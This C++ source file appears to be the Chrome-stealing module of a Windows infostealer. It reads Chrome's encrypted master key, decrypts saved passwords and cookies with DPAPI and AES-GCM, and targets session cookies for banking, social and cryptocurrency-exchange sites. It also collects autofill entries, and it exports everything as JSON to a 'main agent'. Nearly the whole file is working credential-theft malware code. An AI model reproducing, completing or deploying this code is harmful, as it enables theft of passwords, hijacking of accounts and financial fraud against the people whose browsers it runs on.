#include <windows.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <string>
#include <vector>
#include <sstream>
#include <memory>
#include "../common.h"
#include "sqlite_minimal.h"
#include "wallets.h"

// Logging functions
extern void LogInfo(const char* message);
extern void LogError(const char* message);

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

#include "wallets.h"

void ExampleUse() {
    auto profiles = GetBrowserProfiles();
    for (const auto& bp : profiles) {
        const std::string& browser = bp.first;
        const std::string& profilePath = bp.second;

        auto foundBanks = ExtractBankingData(profilePath);
        for (const auto& info : foundBanks) {
            LogInfo(("Bank found in " + browser + ": " + info).c_str());
        }
    }
}


// Chrome data structures
struct ChromeProfile {
    std::wstring name;
    std::wstring path;
};

struct ChromePassword {
    std::string url;
    std::string username;
    std::string password;
};

struct ChromeCookie {
    std::string host;
    std::string name;
    std::string value;
    std::string path;
    bool secure;
    bool httponly;
};

struct ChromeAutofill {
    std::string name;
    std::string value;
};

class ChromeDataExtractor {
private:
    std::wstring chrome_user_data;
    std::vector<uint8_t> master_key;
    std::vector<ChromeProfile> profiles;
    
public:
    ChromeDataExtractor() {
        InitializePaths();
        LoadMasterKey();
        FindProfiles();
    }
    
    // Extract all Chrome data
    std::string ExtractAll() {
        std::stringstream json;
        json << "{";
        json << "\"browser\":\"chrome\",";
        json << "\"version\":\"" << GetChromeVersion() << "\",";
        json << "\"profiles\":[";
        
        bool firstProfile = true;
        for (const auto& profile : profiles) {
            if (!firstProfile) json << ",";
            firstProfile = false;
            
            json << "{";
            json << "\"name\":\"" << Utils::WStringToString(profile.name) << "\",";
            
            // Extract passwords
            json << "\"passwords\":[";
            auto passwords = ExtractPasswords(profile.path);
            bool firstPass = true;
            for (const auto& pass : passwords) {
                if (!firstPass) json << ",";
                firstPass = false;
                
                json << "{";
                json << "\"url\":\"" << EscapeJson(pass.url) << "\",";
                json << "\"username\":\"" << EscapeJson(pass.username) << "\",";
                json << "\"password\":\"" << EscapeJson(pass.password) << "\"";
                json << "}";
            }
            json << "],";
            
            // Extract cookies
            json << "\"cookies\":[";
            auto cookies = ExtractCookies(profile.path);
            bool firstCookie = true;
            for (const auto& cookie : cookies) {
                if (!firstCookie) json << ",";
                firstCookie = false;
                
                json << "{";
                json << "\"host\":\"" << EscapeJson(cookie.host) << "\",";
                json << "\"name\":\"" << EscapeJson(cookie.name) << "\",";
                json << "\"value\":\"" << EscapeJson(cookie.value) << "\",";
                json << "\"path\":\"" << EscapeJson(cookie.path) << "\",";
                json << "\"secure\":" << (cookie.secure ? "true" : "false") << ",";
                json << "\"httponly\":" << (cookie.httponly ? "true" : "false");
                json << "}";
            }
            json << "],";
            
            // Extract autofill
            json << "\"autofill\":[";
            auto autofills = ExtractAutofill(profile.path);
            bool firstAuto = true;
            for (const auto& auto_item : autofills) {
                if (!firstAuto) json << ",";
                firstAuto = false;
                
                json << "{";
                json << "\"name\":\"" << EscapeJson(auto_item.name) << "\",";
                json << "\"value\":\"" << EscapeJson(auto_item.value) << "\"";
                json << "}";
            }
            json << "]";
            
            json << "}";
        }
        
        json << "]}";
        
        return json.str();
    }
    
private:
    void InitializePaths() {
        WCHAR path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
            chrome_user_data = std::wstring(path) + L"\\Google\\Chrome\\User Data";
        }
    }
    
    void FindProfiles() {
        // Default profile
        if (Utils::DirectoryExists(chrome_user_data + L"\\Default")) {
            profiles.push_back({L"Default", chrome_user_data + L"\\Default"});
        }
        
        // Additional profiles (Profile 1, Profile 2, etc.)
        for (int i = 1; i <= 10; i++) {
            std::wstring profileName = L"Profile " + std::to_wstring(i);
            std::wstring profilePath = chrome_user_data + L"\\" + profileName;
            if (Utils::DirectoryExists(profilePath)) {
                profiles.push_back({profileName, profilePath});
            }
        }
    }
    
    bool LoadMasterKey() {
        std::wstring localStatePath = chrome_user_data + L"\\Local State";
        
        HANDLE hFile = CreateFileW(localStatePath.c_str(), GENERIC_READ,
                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
                                  NULL, OPEN_EXISTING, 0, NULL);
        
        if (hFile == INVALID_HANDLE_VALUE) return false;
        
        LARGE_INTEGER fileSize;
        GetFileSizeEx(hFile, &fileSize);
        
        std::vector<char> buffer((size_t)fileSize.QuadPart);
        DWORD bytesRead;
        ReadFile(hFile, buffer.data(), (DWORD)buffer.size(), &bytesRead, NULL);
        CloseHandle(hFile);
        
        // Find encrypted_key in JSON
        std::string json(buffer.begin(), buffer.end());
        size_t keyPos = json.find("\"encrypted_key\":\"");
        if (keyPos == std::string::npos) return false;
        
        keyPos += 17;
        size_t keyEnd = json.find("\"", keyPos);
        if (keyEnd == std::string::npos) return false;
        
        std::string encodedKey = json.substr(keyPos, keyEnd - keyPos);
        
        // Base64 decode
        DWORD decodedSize = 0;
        CryptStringToBinaryA(encodedKey.c_str(), (DWORD)encodedKey.length(),
                            CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL);
        
        std::vector<uint8_t> encryptedKey(decodedSize);
        CryptStringToBinaryA(encodedKey.c_str(), (DWORD)encodedKey.length(),
                            CRYPT_STRING_BASE64, encryptedKey.data(), 
                            &decodedSize, NULL, NULL);
        
        // Remove DPAPI prefix
        if (encryptedKey.size() < 5) return false;
        encryptedKey.erase(encryptedKey.begin(), encryptedKey.begin() + 5);
        
        // Decrypt using DPAPI
        DATA_BLOB input, output;
        input.pbData = encryptedKey.data();
        input.cbData = (DWORD)encryptedKey.size();
        
        if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
            master_key.assign(output.pbData, output.pbData + output.cbData);
            LocalFree(output.pbData);
            return true;
        }
        
        return false;
    }
    
    std::vector<ChromePassword> ExtractPasswords(const std::wstring& profilePath) {
        std::vector<ChromePassword> passwords;
        std::wstring loginDataPath = profilePath + L"\\Login Data";
        
        if (!Utils::FileExists(loginDataPath)) return passwords;
        
        MinimalSQLiteReader reader;
        if (!reader.LoadDatabase(loginDataPath)) return passwords;
        
        uint32_t rootPage = 0;
        if (!reader.FindTableRootPage("logins", rootPage)) return passwords;
        
        auto rows = reader.ExtractTable(rootPage);
        
        for (const auto& row : rows) {
            // Columns: origin_url, username_value, password_value
            if (row.size() >= 7) {
                ChromePassword pass;
                pass.url = BytesToString(row[0]);      // origin_url
                pass.username = BytesToString(row[3]);  // username_value
                
                // Decrypt password
                std::vector<uint8_t> encryptedPass = row[5];  // password_value
                if (!encryptedPass.empty()) {
                    std::string decrypted = DecryptPassword(encryptedPass);
                    pass.password = decrypted;
                    
                    if (!pass.url.empty() && (!pass.username.empty() || !pass.password.empty())) {
                        passwords.push_back(pass);
                    }
                }
            }
        }
        
        return passwords;
    }
    
    std::vector<ChromeCookie> ExtractCookies(const std::wstring& profilePath) {
        std::vector<ChromeCookie> cookies;
        std::wstring cookiesPath = profilePath + L"\\Cookies";
        
        if (!Utils::FileExists(cookiesPath)) return cookies;
        
        MinimalSQLiteReader reader;
        if (!reader.LoadDatabase(cookiesPath)) return cookies;
        
        uint32_t rootPage = 0;
        if (!reader.FindTableRootPage("cookies", rootPage)) return cookies;
        
        auto rows = reader.ExtractTable(rootPage);
        
        // Limit to important cookies
        std::vector<std::string> importantHosts = {
            "facebook.com", "google.com", "amazon.com", "paypal.com",
            "github.com", "twitter.com", "instagram.com", "linkedin.com",
            "binance.com", "coinbase.com", "kraken.com"
        };
        
        for (const auto& row : rows) {
            if (row.size() >= 14) {
                std::string host = BytesToString(row[1]);  // host_key
                
                // Check if it's an important host
                bool isImportant = false;
                for (const auto& important : importantHosts) {
                    if (host.find(important) != std::string::npos) {
                        isImportant = true;
                        break;
                    }
                }
                
                if (isImportant) {
                    ChromeCookie cookie;
                    cookie.host = host;
                    cookie.name = BytesToString(row[2]);   // name
                    cookie.path = BytesToString(row[4]);   // path
                    cookie.secure = BytesToInt(row[8]) != 0;  // is_secure
                    cookie.httponly = BytesToInt(row[9]) != 0; // is_httponly
                    
                    // Decrypt value
                    std::vector<uint8_t> encryptedValue = row[3];  // value
                    if (!encryptedValue.empty()) {
                        cookie.value = DecryptPassword(encryptedValue);
                        if (!cookie.value.empty()) {
                            cookies.push_back(cookie);
                        }
                    }
                }
            }
        }
        
        return cookies;
    }
    
    std::vector<ChromeAutofill> ExtractAutofill(const std::wstring& profilePath) {
        std::vector<ChromeAutofill> autofills;
        std::wstring webDataPath = profilePath + L"\\Web Data";
        
        if (!Utils::FileExists(webDataPath)) return autofills;
        
        MinimalSQLiteReader reader;
        if (!reader.LoadDatabase(webDataPath)) return autofills;
        
        uint32_t rootPage = 0;
        if (!reader.FindTableRootPage("autofill", rootPage)) return autofills;
        
        auto rows = reader.ExtractTable(rootPage);
        
        for (const auto& row : rows) {
            if (row.size() >= 3) {
                ChromeAutofill item;
                item.name = BytesToString(row[0]);   // name
                item.value = BytesToString(row[1]);  // value
                
                // Filter out unimportant entries
                if (!item.name.empty() && !item.value.empty() &&
                    item.value.length() > 3) {  // Skip short values
                    autofills.push_back(item);
                }
            }
        }
        
        return autofills;
    }
    
    std::string DecryptPassword(const std::vector<uint8_t>& encrypted) {
        if (encrypted.size() < 15) return "";
        
        // Check for v10 prefix (Chrome 80+)
        if (encrypted[0] == 'v' && encrypted[1] == '1' && encrypted[2] == '0') {
            if (master_key.empty()) return "";
            
            // Extract nonce and ciphertext
            std::vector<uint8_t> nonce(encrypted.begin() + 3, encrypted.begin() + 15);
            std::vector<uint8_t> ciphertext(encrypted.begin() + 15, encrypted.end() - 16);
            std::vector<uint8_t> tag(encrypted.end() - 16, encrypted.end());
            
            // Decrypt using AES-GCM
            return DecryptAESGCM(ciphertext, nonce, tag);
        } else {
            // Old DPAPI method
            DATA_BLOB input, output;
            input.pbData = (BYTE*)encrypted.data();
            input.cbData = (DWORD)encrypted.size();
            
            if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
                std::string result((char*)output.pbData, output.cbData);
                LocalFree(output.pbData);
                return result;
            }
        }
        
        return "";
    }
    
    std::string DecryptAESGCM(const std::vector<uint8_t>& ciphertext,
                              const std::vector<uint8_t>& nonce,
                              const std::vector<uint8_t>& tag) {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        std::string result;
        
        // Open algorithm provider
        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) {
            return result;
        }
        
        // Set GCM mode
        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, 
                             (PUCHAR)BCRYPT_CHAIN_MODE_GCM, 
                             sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return result;
        }
        
        // Generate key
        if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                      (PUCHAR)master_key.data(), 
                                      (ULONG)master_key.size(), 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return result;
        }
        
        // Setup authentication info
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
        authInfo.pbNonce = (PUCHAR)nonce.data();
        authInfo.cbNonce = (ULONG)nonce.size();
        authInfo.pbTag = (PUCHAR)tag.data();
        authInfo.cbTag = (ULONG)tag.size();
        
        // Decrypt
        std::vector<uint8_t> plaintext(ciphertext.size());
        ULONG cbResult = 0;
        
        NTSTATUS status = BCryptDecrypt(hKey, 
                                       (PUCHAR)ciphertext.data(), 
                                       (ULONG)ciphertext.size(),
                                       &authInfo, 
                                       NULL, 
                                       0,
                                       plaintext.data(), 
                                       (ULONG)plaintext.size(), 
                                       &cbResult, 
                                       0);
        
        if (status == 0) {
            result.assign((char*)plaintext.data(), cbResult);
        }
        
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        
        return result;
    }
    
    std::string GetChromeVersion() {
        // Try to get Chrome version from registry
        HKEY hKey;
        char version[64] = "Unknown";
        DWORD size = sizeof(version);
        
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
                         "Software\\Google\\Chrome\\BLBeacon",
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegQueryValueExA(hKey, "version", NULL, NULL, 
                           (LPBYTE)version, &size);
            RegCloseKey(hKey);
        }
        
        return std::string(version);
    }
    
    std::string EscapeJson(const std::string& str) {
        std::string result;
        for (char c : str) {
            switch (c) {
                case '"': result += "\\\""; break;
                case '\\': result += "\\\\"; break;
                case '\b': result += "\\b"; break;
                case '\f': result += "\\f"; break;
                case '\n': result += "\\n"; break;
                case '\r': result += "\\r"; break;
                case '\t': result += "\\t"; break;
                default:
                    if (c >= 0x20 && c <= 0x7E) {
                        result += c;
                    } else {
                        char buf[7];
                        snprintf(buf, sizeof(buf), "\\u%04x", (unsigned char)c);
                        result += buf;
                    }
            }
        }
        return result;
    }
};

// Export function for main agent
extern "C" {
    const char* ExtractChromeData() {
        static std::string result;
        
        try {
            ChromeDataExtractor extractor;
            result = extractor.ExtractAll();
            
            extern void LogInfo(const char*);
            LogInfo("Chrome data extraction completed");
            
            return result.c_str();
        } catch (...) {
            extern void LogError(const char*);
            LogError("Failed to extract Chrome data");
            
            result = "{\"browser\":\"chrome\",\"error\":\"extraction_failed\",\"profiles\":[]}";
            return result.c_str();
        }
    }
}